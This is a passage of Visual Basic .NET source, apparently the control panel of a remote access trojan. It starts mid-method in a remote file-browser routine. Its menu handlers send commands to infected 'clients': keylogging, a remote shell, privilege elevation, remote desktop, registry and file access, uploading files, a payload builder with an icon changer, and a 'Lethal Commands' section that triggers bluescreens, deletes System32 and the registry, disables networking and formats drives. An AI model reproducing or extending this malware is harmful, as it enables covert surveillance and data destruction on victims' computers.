itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".WMV") Or itm.Text.EndsWith(".asf") Or itm.Text.EndsWith(".ASF") Or itm.Text.EndsWith(".ifo") Or itm.Text.EndsWith(".IFO") Or itm.Text.EndsWith(".vob") Or itm.Text.EndsWith(".VOB") Or itm.Text.EndsWith(".mpls") Or itm.Text.EndsWith(".MPLS") Or itm.Text.EndsWith(".rm") Or itm.Text.EndsWith(".RM") Or itm.Text.EndsWith(".rmvb") Or itm.Text.EndsWith(".RMVB") Then
                                itm.ImageIndex = 6
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".MP3") Or itm.Text.EndsWith(".it") Or itm.Text.EndsWith(".IT") Or itm.Text.EndsWith(".asx") Or itm.Text.EndsWith(".ASX") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".AU") Or itm.Text.EndsWith(".mid") Or itm.Text.EndsWith(".MID") Or itm.Text.EndsWith(".midi") Or itm.Text.EndsWith(".MIDI") Or itm.Text.EndsWith(".snd") Or itm.Text.EndsWith(".SND") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".WMA") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".AIFF") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".OGG") Or itm.Text.EndsWith(".oga") Or itm.Text.EndsWith(".OGA") Or itm.Text.EndsWith(".mka") Or itm.Text.EndsWith(".MKA") Or itm.Text.EndsWith(".m4a") Or itm.Text.EndsWith(".M4A") Or itm.Text.EndsWith(".aac") Or itm.Text.EndsWith(".AAC") Or itm.Text.EndsWith(".flac") Or itm.Text.EndsWith(".FLAC") Or itm.Text.EndsWith(".wv") Or itm.Text.EndsWith(".WV") Or itm.Text.EndsWith(".mpc") Or itm.Text.EndsWith(".MPC") Or itm.Text.EndsWith(".ape") Or itm.Text.EndsWith(".APE") Or itm.Text.EndsWith(".apl") Or itm.Text.EndsWith(".APL") Or itm.Text.EndsWith(".alac") Or itm.Text.EndsWith(".ALAC") Or itm.Text.EndsWith(".tta") Or itm.Text.EndsWith(".TTA") Or itm.Text.EndsWith(".ac3") Or itm.Text.EndsWith(".AC3") Or itm.Text.EndsWith(".dts") Or itm.Text.EndsWith(".DTS") Or itm.Text.EndsWith(".amr") Or itm.Text.EndsWith(".AMR") Or itm.Text.EndsWith(".ra") Or itm.Text.EndsWith(".RA") Or itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".WAV") Or itm.Text.EndsWith(".mpcpl") Or itm.Text.EndsWith(".MPCPL") Or itm.Text.EndsWith(".m3u") Or itm.Text.EndsWith(".M3U") Or itm.Text.EndsWith(".pls") Or itm.Text.EndsWith(".PLS") Then
                                itm.ImageIndex = 7
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".xlsx") Or itm.Text.EndsWith(".XLSX") Or itm.Text.EndsWith(".xlsm") Or itm.Text.EndsWith(".XLSM") Or itm.Text.EndsWith(".xlsb") Or itm.Text.EndsWith(".XLSB") Or itm.Text.EndsWith(".xltm") Or itm.Text.EndsWith(".XLTM") Or itm.Text.EndsWith(".xlam") Or itm.Text.EndsWith(".XLAM") Or itm.Text.EndsWith(".xltx") Or itm.Text.EndsWith(".XLTX") Or itm.Text.EndsWith(".xll") Or itm.Text.EndsWith(".XLL") Then
                                itm.ImageIndex = 8
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".DOC") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".RTF") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".DOCX") Or itm.Text.EndsWith(".docm") Or itm.Text.EndsWith(".DOCM") Or itm.Text.EndsWith(".psw") Or itm.Text.EndsWith(".PSW") Or itm.Text.EndsWith(".dot") Or itm.Text.EndsWith(".DOT") Or itm.Text.EndsWith(".dotx") Or itm.Text.EndsWith(".DOTX") Or itm.Text.EndsWith(".dotm") Or itm.Text.EndsWith(".DOTM") Then
                                itm.ImageIndex = 9
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".INI") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".SYS") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".CSS") Or itm.Text.EndsWith(".inf") Or itm.Text.EndsWith(".INF") Then
                                itm.ImageIndex = 10
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".pdf") Or itm.Text.EndsWith(".PDF") Then
                                itm.ImageIndex = 11
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".iso") Or itm.Text.EndsWith(".ISO") Then
                                itm.ImageIndex = 12
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".vbs") Or itm.Text.EndsWith(".VBS") Or itm.Text.EndsWith(".vbe") Or itm.Text.EndsWith(".VBE") Or itm.Text.EndsWith(".wsf") Or itm.Text.EndsWith(".WSF") Or itm.Text.EndsWith(".wsc") Or itm.Text.EndsWith(".WSC") Then
                                itm.ImageIndex = 13
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".sln") Or itm.Text.EndsWith(".SLN") Or itm.Text.EndsWith(".vb") Or itm.Text.EndsWith(".VB") Or itm.Text.EndsWith(".vbproj") Or itm.Text.EndsWith(".VBPROJ") Then
                                itm.ImageIndex = 14
                                addtolist = True
                                itm.SubItems.Add("File")
                            Else
                                itm.ImageIndex = 15
                                itm.SubItems.Add("File")
                            End If

                            If addtolist = True Then
                                fff.ListView1.Items.Add(itm)
                                addtolist = False
                            End If

                            i += 1

                        Next
                        fff.ToolStripStatusLabel1.Text = "Status: Ready"
                    End If
            End Select

        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub
#End Region

    Public Function ENB(ByRef s As String) As String ' Encode base64
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "close")
        Next
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "restart")
        Next
    End Sub

    Private Sub UninstalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstalToolStripMenuItem.Click
        Dim Result As Integer = MessageBox.Show("Are you sure you want to uninstall the client on " & L1.SelectedItems.Count.ToString & " computer\s ?" & Environment.NewLine & "The clients won't come back!",
        "Uninstall Confirmation",
                        MessageBoxButtons.YesNo, MessageBoxIcon.Question)
        If Result = DialogResult.Yes Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "uninstall")
            Next

        End If


    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        Builder.ShowDialog()
    End Sub

    Private Sub ElevateClientPermissionsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ElevateClientPermissionsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "elevate")
        Next
    End Sub

    Private Sub UpdateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        If o.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim n As New IO.FileInfo(o.FileName)
            If o.FileName.Length > 0 Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.ToolTipText, "sendfile" & Yy & n.Name & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            Else

            End If
        Else
            MsgBox("Please select a file!", MsgBoxStyle.Critical)

        End If
    End Sub

    Private Sub SettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SettingsToolStripMenuItem.Click
        Settings.ShowDialog()
    End Sub

    Private Sub RDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RDPToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "!")
        Next
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "|||")
        Next
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openkl")
        Next
    End Sub

    Private Sub AddNoteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddNoteToolStripMenuItem.Click
        If L1.SelectedItems.Count > 1 Then
            MsgBox("You can set notes for one client at time!", MsgBoxStyle.Critical)
            Return
        End If
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "notes")
        Next
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        End
    End Sub

    Private Sub RestoreToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestoreToolStripMenuItem.Click
        If Me.WindowState.Minimized Then
            Me.WindowState = WindowState.Normal
        End If
    End Sub

    Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        If Me.WindowState.Minimized Then
            Me.WindowState = WindowState.Normal
        End If
    End Sub

    Private Sub TaskManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TaskManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "OpenPro")
        Next
    End Sub

    Private Sub ShellToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShellToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openshell")
        Next
    End Sub

    Private Sub InformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InformationToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "sendinformation")
        Next
    End Sub

    Private Sub mnuItem_Clicked(sender As Object, e As EventArgs)
        ContextMenuStrip1.Hide() 'Sometimes the menu items can remain open.  May not be necessary for you.
        Dim item As ToolStripMenuItem = TryCast(sender, ToolStripMenuItem)
        If item IsNot Nothing Then
            'Retrive group index
            Dim ind As Integer = 0
            For Each gr As ListViewGroup In L1.Groups
                If gr.Header = item.Text Then
                    'Got index correct
                    For Each x As ListViewItem In L1.SelectedItems
                        x.Group = L1.Groups(ind)
                    Next

                End If
                ind += 1
            Next


        End If

    End Sub
    Dim firstmenuadd As Integer = 0

    Private Sub AddNewToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddNewToolStripMenuItem.Click
        Dim input As String
        input = InputBox("Group Name :", "GROUP BY:")

        Dim general_group As New ListViewGroup(input)
        L1.Groups.Add(general_group)

        For Each item As ListViewItem In Me.L1.SelectedItems
            L1.Items.Item(item.ToolTipText).Group = L1.Groups(L1.Groups.Count - 1)
        Next

        If firstmenuadd = 0 Then
            GroupToolStripMenuItem.DropDownItems.Add("-")
            firstmenuadd += 1
        End If

        Dim menu1 As New ToolStripMenuItem() With {.Text = input, .Name = input}

        AddHandler menu1.Click, AddressOf mnuItem_Clicked
        menu1.Image = My.Resources.newgroup
        GroupToolStripMenuItem.DropDownItems.Add(menu1)


    End Sub
    Private lviDraggedItem As ListViewItem

    Private Sub L1_DragEnter(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles L1.DragEnter
        e.Effect = DragDropEffects.Move
    End Sub

    Private Sub ListView1_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles L1.DragDrop

        Dim htInfo As ListViewHitTestInfo = L1.HitTest(L1.PointToClient(New Point(e.X, e.Y)))

        Dim lviSibling As ListViewItem = htInfo.Item

        Dim lvgGroup As ListViewGroup = lviSibling.Group

        lvgGroup.Items.Add(lviDraggedItem)

        lviDraggedItem = Nothing


    End Sub

    Private Sub ListView1_ItemDrag(ByVal sender As System.Object, ByVal e As System.Windows.Forms.ItemDragEventArgs) Handles L1.ItemDrag

        lviDraggedItem = e.Item
        L1.DoDragDrop(L1.SelectedItems, DragDropEffects.Move)


    End Sub

    Private int_0 As Integer = 0 'Gives Interval To Timer

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Me.int_0 += 1
            If (Me.int_0 = 10) Then
                Me.int_0 = 0
                upl.Text = (smethod_17(long_0))
                dwn.Text = (smethod_17(long_1))
                long_0 = 0
                long_1 = 0
            End If

        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub NetHelperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NetHelperToolStripMenuItem.Click
        NetHelper.ShowDialog()

    End Sub

    Private Sub RegistryEditorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RegistryEditorToolStripMenuItem.Click
        Try

            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "openRG" & Yy)
            Next
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub LogsSettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogsSettingsToolStripMenuItem.Click
        LogSettings.ShowDialog()

    End Sub

    Private Sub ViewSystemLogsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ViewSystemLogsToolStripMenuItem.Click
        LogsViewer.ShowDialog()

    End Sub

    'Lethal Commands
    Private Sub BlueScreenOfDeathToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim Result As Integer = MessageBox.Show("Probably you will loose the connection with your client! Are you sure ?" & L1.SelectedItems.Count.ToString & " computer\s ?" & Environment.NewLine & "The clients won't come back!",
        "Confirmation",
                        MessageBoxButtons.YesNo, MessageBoxIcon.Question)
        If Result = DialogResult.Yes Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "bluescreenofdeath")
            Next
        End If

    End Sub

    Private Sub DeleteSystem32ToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim Result As Integer = MessageBox.Show("Probably you will loose the connection with your client! Are you sure ?" & L1.SelectedItems.Count.ToString & " computer\s ?" & Environment.NewLine & "The clients won't come back!",
        "Confirmation",
                        MessageBoxButtons.YesNo, MessageBoxIcon.Question)
        If Result = DialogResult.Yes Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "delsys32")
            Next
        End If

    End Sub

    Private Sub DeleteRegistryToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim Result As Integer = MessageBox.Show("Probably you will loose the connection with your client! Are you sure ?" & L1.SelectedItems.Count.ToString & " computer\s ?" & Environment.NewLine & "The clients won't come back!",
        "Confirmation",
                        MessageBoxButtons.YesNo, MessageBoxIcon.Question)
        If Result = DialogResult.Yes Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "delregwin")
            Next
        End If

    End Sub

    Private Sub DisableInternetToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim Result As Integer = MessageBox.Show("Probably you will loose the connection with your client! Are you sure ?" & L1.SelectedItems.Count.ToString & " computer\s ?" & Environment.NewLine & "The clients won't come back!",
        "Confirmation",
                        MessageBoxButtons.YesNo, MessageBoxIcon.Question)
        If Result = DialogResult.Yes Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "diseth")
            Next
        End If
    End Sub

    Private Sub FormatDriversToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim Result As Integer = MessageBox.Show("Probably you will loose the connection with your client! Are you sure ?" & L1.SelectedItems.Count.ToString & " computer\s ?" & Environment.NewLine & "The clients won't come back!",
        "Confirmation",
                        MessageBoxButtons.YesNo, MessageBoxIcon.Question)
        If Result = DialogResult.Yes Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "delwin")
            Next
        End If

    End Sub

    Private Sub DownloaderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloaderToolStripMenuItem.Click
        Downloader.ShowDialog()
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        Dim counter As Integer = 0
        For Each x As ListViewItem In L1.SelectedItems
            counter += 1
        Next
        Label11.Text = "Selected : " & counter.ToString

    End Sub

    Private Sub IconChangerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles IconChangerToolStripMenuItem.Click
        Icon_Changer.ShowDialog()
    End Sub


End Class
